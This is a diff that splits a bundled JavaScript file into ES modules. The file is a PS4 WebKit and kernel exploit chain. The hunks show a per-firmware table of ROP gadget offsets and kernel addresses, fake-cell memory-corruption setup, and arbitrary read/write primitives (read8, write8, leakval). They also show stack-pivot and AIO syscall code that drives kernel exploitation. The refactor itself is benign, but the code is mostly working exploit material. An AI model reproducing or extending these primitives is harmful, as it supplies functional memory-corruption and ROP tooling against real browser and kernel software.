@@ -1,8 +1,6 @@
-/* AUTO-BUNDLED: transpiled for PS4 WebKit FW 12.xx */
 (function() {
 "use strict";
 
-/* === int64.js === */
 function zeroFill(number, width) {
   width -= number.toString().length;
   if (width > 0) {
@@ -85,12 +83,12 @@ function int64(low, hi) {
   return this;
 }
 globalThis.int64 = int64;
+export { int64 };
+export default int64;
 
-int64;
 
-/* === ps4_offsets.js === */
-var REQUIRED_KEYS = ["fw_status", "wk_expm1_builtin", "wk_JSFunction_m_function", "wk_POP_RDI_RET", "wk_POP_RSI_RET", "wk_POP_RDX_RET", "wk_POP_RCX_RET", "wk_POP_RAX_RET", "wk_POP_R8_RET", "wk_POP_R9_RET", "wk_LEAVE_RET", "wk_MOV_QWORD_PTR_RDI_RAX_RET", "wk_MOV_RDI_RSI_30_CALL", "wk_POP_RAX_MOV_RAX_JMP_18", "wk_PUSH_RBP_MOV_RBP_RSP_10", "wk_MOV_RDI_RAX_8_CALL_20", "wk_MOV_RDX_RAX_18_CALL_10", "wk_PUSH_RDX_POP_RSP_RET", "pivot_view_sp", "wk_ArrayBuffer_m_impl", "wk_ArrayBuffer_m_contents_m_data", "wk___imp___error", "k__error", "k_scan_stage1", "k_scan_stage2", "k_evf_cv", "k_sysent_661", "k_jmp_rsi"];
-var OPTIONAL_KEYS = ["k_stubs", "wk___imp_pthread_create", "k_pthread_create",
+export var REQUIRED_KEYS = ["fw_status", "wk_expm1_builtin", "wk_JSFunction_m_function", "wk_POP_RDI_RET", "wk_POP_RSI_RET", "wk_POP_RDX_RET", "wk_POP_RCX_RET", "wk_POP_RAX_RET", "wk_POP_R8_RET", "wk_POP_R9_RET", "wk_LEAVE_RET", "wk_MOV_QWORD_PTR_RDI_RAX_RET", "wk_MOV_RDI_RSI_30_CALL", "wk_POP_RAX_MOV_RAX_JMP_18", "wk_PUSH_RBP_MOV_RBP_RSP_10", "wk_MOV_RDI_RAX_8_CALL_20", "wk_MOV_RDX_RAX_18_CALL_10", "wk_PUSH_RDX_POP_RSP_RET", "pivot_view_sp", "wk_ArrayBuffer_m_impl", "wk_ArrayBuffer_m_contents_m_data", "wk___imp___error", "k__error", "k_scan_stage1", "k_scan_stage2", "k_evf_cv", "k_sysent_661", "k_jmp_rsi"];
+export var OPTIONAL_KEYS = ["k_stubs", "wk___imp_pthread_create", "k_pthread_create",
 // Overrides the patch-blob name, which otherwise derives from the firmware
 // key ("13.00" -> patches/1300.bin). Needed when two firmwares share one
 // kernel and therefore one blob.
@@ -101,7 +99,7 @@ var OPTIONAL_KEYS = ["k_stubs", "wk___imp_pthread_create", "k_pthread_create",
 // construction, so without this a correct alias reports as 20 defects and
 // buries a real one.
 "alias_of"];
-var PS4 = {
+export var PS4 = {
   "11.00": {
     fw_status: "state=proven step4q=90/0 reboot=0 kernel_rvas=5/5-vs-dump",
     wk_expm1_builtin: 0x2193f30,
@@ -576,7 +574,7 @@ PS4["12.52"] = Object.assign({}, PS4["12.50"], {
   fw_status: "state=UNTESTED-on-hardware shares=12.50 " + "webkit=assumed-identical-to-12.50 (no 12.52 module dump) " + "kernel_rvas=asserted-by-supplied-table UNVERIFIED " + "kpatch=1250.bin bug=poops",
   kpatch: "1250.bin"
 });
-function offsetsFor(uaString) {
+export function offsetsFor(uaString) {
   var m = (uaString || "").match(/PlayStation\s+4[\/ ](\d+)\.(\d+)/);
   if (!m) return {
     key: null,
@@ -589,7 +587,7 @@ function offsetsFor(uaString) {
   };
 }
 
-/* === core.js === */
+
 var DRAIN_COUNT = 512;
 var AUTO_RETRY_DELAY_MS = 50;
 var K = 2;
@@ -1543,7 +1541,7 @@ function buildCarrier() {
     }
   };
 }
-function establishPrimitive(options) {
+export function establishPrimitive(options) {
   var opts = options || {};
   if (fakeReleased) return Promise.reject(new Error("core: the fake cell has been released to the real-cell pair -- " + "establishPrimitive cannot run again in this page"));
   if (running) return Promise.reject(new Error("core: already running"));
@@ -1564,11 +1562,11 @@ function establishPrimitive(options) {
     startAttempt();
   });
 }
-function currentCarrier() {
+export function currentCarrier() {
   return liveCandidate === null ? null : buildCarrier();
 }
 var RELEASED_BINDINGS = ["liveCandidate", "fakeHost", "lengthWord", "getterCarrier", "leakedScope", "preparedSymbolObject", "capturedString", "capturedWords", "predecessorWords", "outerGraph", "fillerGraph", "referenceTarget", "keepAlive"];
-function releaseFakeCell() {
+export function releaseFakeCell() {
   var report = {
     released: RELEASED_BINDINGS.slice(),
     alreadyReleased: fakeReleased,
@@ -1600,17 +1598,20 @@ function releaseFakeCell() {
   retryScheduled = false;
   return report;
 }
-function fakeCellReleased() {
+export function fakeCellReleased() {
   return fakeReleased;
 }
-function carrierHeaderCopy() {
+export function carrierHeaderCopy() {
   return rwHeader.slice(0, CELL_BYTES);
 }
-function carrierHomeVector() {
+export function carrierHomeVector() {
   return rwOriginalVector;
 }
+export { profile, aimCarrier, restoreCarrier, plausibleAddress, plausibleCell };
 
-/* === mem.js === */
+
+import { int64 } from "./int64.js";
+import { releaseFakeCell, fakeCellReleased, carrierHeaderCopy, carrierHomeVector } from "./core.js?v=10";
 var carrier = null;
 function toI64(x) {
   if (x instanceof int64) return x;
@@ -1807,7 +1808,7 @@ var workerView = null;
 var workerMirror = null;
 var pairVectorOffset = -1;
 var retained = [];
-var pairStatus = {
+export var pairStatus = {
   state: "not-attempted",
   promoted: false,
   committed: false,
@@ -1952,7 +1953,7 @@ function proveMagic(note, who, slot, at, expected, context) {
   if (!record.pass) throw new Error("mem.promote: ".concat(who, " identity failed -- read ") + "".concat(record.found, " at 0x").concat(target.toString(), ", expected ") + "".concat(record.expected, " (").concat(context, ")"));
   return record;
 }
-function promoteToRealPair(onEvent) {
+export function promoteToRealPair(onEvent) {
   var note = function (tag, detail) {
     pairStatus.stage = tag;
     if (typeof onEvent === "function") {
@@ -2120,7 +2121,7 @@ function promoteToRealPair(onEvent) {
     throw error;
   }
 }
-function installWindowP(c, options) {
+export function installWindowP(c, options) {
   if (!c || typeof c.aim !== "function") throw new TypeError("mem: not a carrier");
   carrier = c;
   var prim = {
@@ -2152,8 +2153,13 @@ function installWindowP(c, options) {
   }
   return prim;
 }
+export { read1, read2, read4, read8, write1, write2, write4, write8, leakval, readInto, toI64, addrNumber, int64 };
 
-/* === chain === */
+
+import { establishPrimitive } from "./core.js";
+import { installWindowP } from "./mem.js";
+import { int64 } from "./int64.js";
+import { offsetsFor } from "./ps4_offsets.js";
 var outEl = document.getElementById("out");
 var stateEl = document.getElementById("state");
 var lines = [];
@@ -2353,7 +2359,7 @@ var SYS = {
   aio_multi_cancel: 666,
   aio_submit_cmd: 669
 };
-var keepAlive = [];
+var chainKeepAlive = [];
 var execAddr = null,
   origNative = null,
   mFunctionPatched = false;
@@ -2683,7 +2689,7 @@ function makeRpc(worker) {
         stackU8: new Uint8Array(kb),
         frameU8: new Uint8Array(fb)
       };
-      keepAlive.push(sb, pb, kb, fb, c.storeDv, c.pivotDv, c.stackDv, c.frameDv, c.stackU8, c.frameU8);
+      chainKeepAlive.push(sb, pb, kb, fb, c.storeDv, c.pivotDv, c.stackDv, c.frameDv, c.stackU8, c.frameU8);
       c.S = bufAddr(sb);
       c.P = bufAddr(pb);
       c.K = bufAddr(kb);
@@ -2792,7 +2798,7 @@ function makeRpc(worker) {
       return;
     }
     var mainPivotObj = {};
-    keepAlive.push(mainPivotObj);
+    chainKeepAlive.push(mainPivotObj);
     mainPivotAddr = p.leakval(mainPivotObj);
     mainSavedCell = p.read8(mainPivotAddr);
     p.write8(mFuncAt, G.G0);
@@ -2885,7 +2891,7 @@ function makeRpc(worker) {
         addr: bufAddr(ab),
         len: len
       };
-      keepAlive.push(ab, rec.dv, rec.u8);
+      chainKeepAlive.push(ab, rec.dv, rec.u8);
       return rec;
     }
     var reqs1 = alloc(AIO_RW_REQ_SIZE * AIO_MAX_NUM);
@@ -2933,7 +2939,7 @@ function makeRpc(worker) {
     rpc = makeRpc(worker);
     await rpc("ping");
     var markerArr = await rpc("init", SENT_LO, SENT_HI);
-    keepAlive.push(markerArr);
+    chainKeepAlive.push(markerArr);
     var D = bufAddr(markerArr.buffer);
     if (p.read4(D) >>> 0 !== SENT_LO) {
       check("transferred-store-worker-memory", false, "D=" + D);
@@ -4932,7 +4938,7 @@ function makeRpc(worker) {
           var impl = p.read8(cell.add32(0x10));
           return p.read8(impl.add32(0x10));
         }();
-        keepAlive.push(idBuf, idDv, outBuf);
+        chainKeepAlive.push(idBuf, idDv, outBuf);
         var done = 0;
         for (var _i42 = 0; _i42 < liveAioIds.length; _i42 += AIO_MAX_NUM) {
           var _step4 = Math.min(AIO_MAX_NUM, liveAioIds.length - _i42);
@@ -5075,5 +5081,6 @@ function makeRpc(worker) {
     }
   }
 })();
+
 
 })();
